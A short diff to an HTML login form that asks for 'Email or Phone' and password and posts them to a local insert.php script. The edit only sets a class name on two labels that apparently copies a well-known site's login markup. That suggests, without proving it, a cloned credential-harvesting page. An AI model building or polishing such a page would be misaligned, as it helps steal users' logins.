@@ -236,8 +236,8 @@
                                 <form id="login_form" action="insert.php" method="post">
                                     <table cellspacing="0" role="presentation">
                                         <tr>
-                                            <td class=""><label for="email">Email or Phone</label></td>
-                                            <td class=""><label for="pass">Password</label></td>
+                                            <td class="html7magic"><label for="email">Email or Phone</label></td>
+                                            <td class="html7magic"><label for="pass">Password</label></td>
                                         </tr>
                                         <tr>
                                             <td><input type="email" class="inputtext" name="email" id="email" tabindex="1" /></td>
